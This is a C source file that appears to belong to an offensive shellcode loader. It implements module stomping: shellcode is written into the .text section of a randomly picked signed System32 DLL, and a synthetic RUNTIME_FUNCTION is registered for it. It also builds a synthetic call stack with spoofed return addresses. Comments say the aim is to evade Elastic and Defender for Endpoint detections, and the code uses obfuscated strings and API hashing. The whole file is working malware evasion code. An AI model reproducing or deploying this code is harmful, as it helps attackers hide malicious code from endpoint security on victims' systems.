// =============================================
// Stomper.c - Module Stomping + Synthetic Stack
// =============================================
//
// ModuleStomp: overwrite a sacrificial DLL's .text
//   section with shellcode, register a synthetic
//   RUNTIME_FUNCTION so RtlLookupFunctionEntry succeeds.
//
// BuildSyntheticStack: allocate a 1 MB private buffer
//   with three fake return addresses near the top, so
//   SpoofCallback can swap RSP to make kernel stack-walks
//   see a plausible thread-start chain.
//
// Phantom DLL hollowing lives in Phantom.c.
// Call-gadget pool lives in Gadgets.c.
// =============================================

#include "Common.h"

// -----------------------------------------------
// Sacrificial DLL allowlist picker.
//
// Replaces the previous "scan all of System32 for any large-enough DLL" logic
// with a fixed 4-entry allowlist of low-sensitivity DLLs (multimedia / debug /
// printing). Reasons:
//
//   1. Determinism: known-good targets, no chance of picking up a Defender-
//      reputation-flagged module (e.g. crypto, authentication, AAD helpers).
//   2. Avoids Elastic / MDE rules that pin known stomp targets (msftedit.dll,
//      wwanmm.dll, winhttp.dll, aadauthhelper.dll, amd_comgr.dll).
//   3. Per-run rotation via RDTSC, so static "loader uses X.dll" signatures
//      can't form across multiple samples.
//
// For each candidate (in randomized order):
//   - File present in System32 ?
//   - Executable section large enough for shellcode ?
//   - Not already loaded in this process (Phantom only — ModuleStomp loads it
//     itself; pass IsForLoad=TRUE to skip this check)
// First match wins.
// -----------------------------------------------
BOOL PickSacrificialDll(
    IN  PAPI_HASHING pApi,
    IN  DWORD        dwMinSize,
    OUT PCHAR        pOutName,
    OUT PCHAR        pOutFullPath
) {
    if (!pApi || !pOutName) return FALSE;

    // Deobfuscate the 4 candidate filenames.
    BYTE xDll1[] = XSTR_STOMP_DLL_1; DEOBF(xDll1);
    BYTE xDll2[] = XSTR_STOMP_DLL_2; DEOBF(xDll2);
    BYTE xDll3[] = XSTR_STOMP_DLL_3; DEOBF(xDll3);
    BYTE xDll4[] = XSTR_STOMP_DLL_4; DEOBF(xDll4);
    LPCSTR candidates[4] = { (LPCSTR)xDll1, (LPCSTR)xDll2, (LPCSTR)xDll3, (LPCSTR)xDll4 };

    // RDTSC-seeded Fisher-Yates of indices [0..3].
    ULONGLONG tsc = __rdtsc();
    BYTE order[4] = { 0, 1, 2, 3 };
    for (int i = 3; i > 0; i--) {
        int j = (int)((tsc >> (i * 7)) & 0xFF) % (i + 1);
        BYTE t = order[i]; order[i] = order[j]; order[j] = t;
    }

    BYTE xPrefix[] = XSTR_SYS32_PREFIX;
    DEOBF(xPrefix);
    SIZE_T nPre = StrLenA((LPCSTR)xPrefix);

    BYTE xCreateFile[] = XSTR_CREATE_FILE_A;
    DEOBF(xCreateFile);
    BYTE xK32[] = XSTR_KERNEL32_DLL;
    DEOBF(xK32);
    HMODULE hK32 = pApi->pGetModuleHandleA((LPCSTR)xK32);
    if (!hK32) return FALSE;
    fnCreateFileA2 pCreateFile = (fnCreateFileA2)pApi->pGetProcAddress(hK32, (LPCSTR)xCreateFile);
    fnReadFile pReadFile = (fnReadFile)FetchExportAddress((PVOID)hK32, ReadFile_JOAAT);
    fnCloseHandle2 pCloseHandle = (fnCloseHandle2)FetchExportAddress((PVOID)hK32, CloseHandle_JOAAT);
    if (!pCreateFile || !pReadFile || !pCloseHandle) return FALSE;

    for (int idx = 0; idx < 4; idx++) {
        LPCSTR name = candidates[order[idx]];
        SIZE_T nName = StrLenA(name);

        CHAR szFull[260];
        MemSet(szFull, 0, sizeof(szFull));
        MemCopy(szFull, xPrefix, nPre);
        MemCopy(szFull + nPre, name, nName);

        HANDLE hFile = pCreateFile(szFull, GENERIC_READ, FILE_SHARE_READ,
                                   NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) continue;

        BYTE peHdr[1024];
        DWORD dwRead = 0;
        BOOL ok = pReadFile(hFile, peHdr, sizeof(peHdr), &dwRead, NULL);
        pCloseHandle(hFile);
        if (!ok) continue;

        PIMAGE_NT_HEADERS pNt = NULL;
        if (!ValidatePeHeadersBounded(peHdr, dwRead, &pNt)) continue;

        PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
        BOOL fits = FALSE;
        for (WORD s = 0; s < pNt->FileHeader.NumberOfSections; s++) {
            if ((pSec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                pSec[s].SizeOfRawData >= dwMinSize) {
                fits = TRUE; break;
            }
        }
        if (!fits) continue;

        MemCopy(pOutName, name, nName + 1);
        if (pOutFullPath) MemCopy(pOutFullPath, szFull, nPre + nName + 1);
        return TRUE;
    }
    return FALSE;
}

// -----------------------------------------------
// Build a synthetic call stack (Draugr MVP).
//
// Allocates a 1 MB private buffer and writes three fake return
// addresses near the top. Each points 0x20 bytes past an exported
// entry (RtlUserThreadStart, BaseThreadInitThunk, NtWaitForSingleObject)
// so the RIP lands inside the function body — within its legit
// RUNTIME_FUNCTION Begin/End range, giving stackwalker a valid handle.
//
// Returned pointer is the synthetic RSP (top-of-stack = fake_ret_inner).
// SpoofCallback's asm stub loads this value into RSP before jumping
// to the call gadget, so kernel-side callstack walkers see a plausible
// "fresh thread" chain instead of our fiber/worker stack bottom.
//
// Frame layout (lower addresses at the bottom):
//   [buffer  .. pRsp-X]       <-- room for shellcode to push into
//   pRsp     -> fake_ret_inner   (NtWaitForSingleObject + 0x20)
//   pRsp+8   -> fake_ret_mid     (RtlUserThreadStart + 0x20)
//   pRsp+16  -> fake_ret_outer   (BaseThreadInitThunk + 0x20)
//   [above pRsp+24 .. buffer end]  unused headroom
// -----------------------------------------------
#define FAKE_STACK_BYTES   (1024 * 1024)   /* 1 MB total */
#define FAKE_STACK_HEADROOM 0x10000         /* 64 KB above RSP, unused */

PVOID BuildSyntheticStack(IN PAPI_HASHING pApi) {

    (void)pApi;

    PVOID pNtdll    = FindLoadedModuleW(L"NTDLL.DLL");
    PVOID pKernel32 = FindLoadedModuleW(L"KERNEL32.DLL");
    if (!pNtdll || !pKernel32)
        return NULL;

    PVOID pInner = FetchExportAddress(pNtdll, NtWaitForSingleObject_JOAAT);
    PVOID pMid   = FetchExportAddress(pNtdll, RtlUserThreadStart_JOAAT);
    PVOID pOuter = FetchExportAddress(pKernel32, BaseThreadInitThunk_JOAAT);
    if (!pInner || !pMid || !pOuter)
        return NULL;

    // Offset past each function's prologue so the fake RIP lands
    // solidly inside the function body (and thus inside the module's
    // RUNTIME_FUNCTION Begin/End range).
    pInner = (PBYTE)pInner + 0x20;
    pMid   = (PBYTE)pMid   + 0x20;
    pOuter = (PBYTE)pOuter + 0x20;

    PBYTE pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, FAKE_STACK_BYTES);
    if (!pBuffer)
        return NULL;

    PVOID* pRsp = (PVOID*)(pBuffer + FAKE_STACK_BYTES - FAKE_STACK_HEADROOM);
    pRsp[0] = pInner;   // shellcode pops this first on its first `ret`
    pRsp[1] = pMid;     // then this
    pRsp[2] = pOuter;   // outermost (thread-start-like) frame

    return (PVOID)pRsp;
}

// -----------------------------------------------
// Synthetic RUNTIME_FUNCTION registered with
// RtlAddFunctionTable after stomping. The kernel
// stores the pointer — it must have static lifetime.
//
// Elastic 8.11+ kernel ETW callstack validation flags
// frames whose RIP falls inside executable memory with
// no matching RUNTIME_FUNCTION entry. Registering a
// minimum-viable unwind descriptor for the stomped
// region makes RtlLookupFunctionEntry(rip) return a
// valid handle, satisfying the check. Accurate unwind
// isn't required — the stackwalker treats our region
// as a leaf function and walks past it to the (real)
// caller frame injected by the call-gadget spoof.
// -----------------------------------------------
static RUNTIME_FUNCTION g_StompRuntimeFunc = { 0 };

// -----------------------------------------------
// Module Stomping
// Loads a sacrificial DLL and overwrites its
// executable section with shellcode, so the
// shellcode memory is attributed to a signed DLL.
// After the overwrite, registers a synthetic
// RUNTIME_FUNCTION for the shellcode region.
//
// Memory protection is controlled by SHELLCODE_EXEC_PROT:
//   RWX_SHELLCODE defined:   PAGE_EXECUTE_READWRITE (Go/Sliver)
//   RWX_SHELLCODE undefined: PAGE_EXECUTE_READ (W^X)
// -----------------------------------------------
BOOL ModuleStomp(
    IN  PAPI_HASHING pApi,
    IN  PBYTE        pShellcode,
    IN  DWORD        dwShellcodeSize,
    OUT PVOID*       ppExecAddr
) {
    if (!pApi || !pShellcode || !ppExecAddr || dwShellcodeSize == 0)
        return FALSE;

    // Pick a sacrificial DLL from the per-build allowlist (random order).
    CHAR szPickName[260] = { 0 };
    if (!PickSacrificialDll(pApi, dwShellcodeSize, szPickName, NULL)) {
        LOG("[!] Module stomp: no allowlisted DLL fits shellcode");
        return FALSE;
    }
    HMODULE hModule = pApi->pLoadLibraryA(szPickName);
    if (!hModule) {
        LOG("[!] Module stomp: LoadLibrary failed");
        return FALSE;
    }
    LOG("[+] Module stomp: sacrificial DLL loaded (from allowlist)");

    // Parse PE headers to find executable section
    PIMAGE_NT_HEADERS pNt = NULL;
    if (!ValidatePeHeaders((PVOID)hModule, &pNt))
        return FALSE;

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    PVOID  pTextBase = NULL;
    DWORD  dwTextSize = 0;

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            pTextBase = (PVOID)((PBYTE)hModule + pSection[i].VirtualAddress);
            dwTextSize = pSection[i].Misc.VirtualSize;
            break;
        }
    }

    if (!pTextBase || dwTextSize < dwShellcodeSize) {
        LOG("[!] Module stomp: .text section too small or not found");
        return FALSE;
    }

    // Reserve 4 bytes (DWORD-aligned) after shellcode for minimum UNWIND_INFO
    DWORD dwUnwindOffset = (dwShellcodeSize + 3) & ~3u;
    DWORD dwWriteSize    = dwShellcodeSize;
    BOOL  bHasUnwindSlot = FALSE;
    if (dwTextSize >= dwUnwindOffset + sizeof(DWORD)) {
        dwWriteSize    = dwUnwindOffset + sizeof(DWORD);
        bHasUnwindSlot = TRUE;
    }

    // Change protection to RW for writing (covers shellcode + unwind slot)
    DWORD dwOldProtect = 0;
    if (!pApi->pVirtualProtect(pTextBase, (SIZE_T)dwWriteSize, PAGE_READWRITE, &dwOldProtect)) {
        LOG("[!] Module stomp: VirtualProtect(RW) failed");
        return FALSE;
    }

    // Overwrite .text with shellcode
    MemCopy(pTextBase, pShellcode, dwShellcodeSize);

    // Write minimum UNWIND_INFO (4 bytes): version=1, flags=0, prolog=0,
    // unwind-code-count=0, frame-register=0, frame-offset=0. Describes a
    // leaf function with no prologue — stackwalker will pop the return
    // address and continue to the caller frame without error.
    PBYTE pUnwindInfo = NULL;
    if (bHasUnwindSlot) {
        pUnwindInfo = (PBYTE)pTextBase + dwUnwindOffset;
        pUnwindInfo[0] = 0x01;  // Version (3 bits) + Flags (5 bits)
        pUnwindInfo[1] = 0x00;  // SizeOfProlog
        pUnwindInfo[2] = 0x00;  // CountOfUnwindCodes
        pUnwindInfo[3] = 0x00;  // FrameRegister (4 bits) + FrameOffset (4 bits)
    }

    // Set final execution protection (RX or RWX depending on build config)
    DWORD dwDummy = 0;
    if (!pApi->pVirtualProtect(pTextBase, (SIZE_T)dwWriteSize, SHELLCODE_EXEC_PROT, &dwDummy)) {
        LOG("[!] Module stomp: VirtualProtect(exec) failed");
        return FALSE;
    }

    // Register synthetic RUNTIME_FUNCTION so RtlLookupFunctionEntry(rip)
    // succeeds for the stomped region. Best-effort — stomp itself is
    // successful either way.
    if (bHasUnwindSlot) {
        typedef BOOLEAN(NTAPI * fnRtlAddFunctionTable)(PRUNTIME_FUNCTION, DWORD, DWORD64);
        fnRtlAddFunctionTable pAdd = (fnRtlAddFunctionTable)FetchExportAddress(
            FindLoadedModuleW(L"NTDLL.DLL"), RtlAddFunctionTable_JOAAT
        );
        if (pAdd) {
            g_StompRuntimeFunc.BeginAddress = (DWORD)((ULONG_PTR)pTextBase - (ULONG_PTR)hModule);
            g_StompRuntimeFunc.EndAddress   = g_StompRuntimeFunc.BeginAddress + dwShellcodeSize;
            g_StompRuntimeFunc.UnwindData   = (DWORD)((ULONG_PTR)pUnwindInfo - (ULONG_PTR)hModule);
            pAdd(&g_StompRuntimeFunc, 1, (DWORD64)hModule);
        }
    }

    *ppExecAddr = pTextBase;
    LOG("[+] Module stomp: shellcode planted in DLL .text section");
    return TRUE;
}
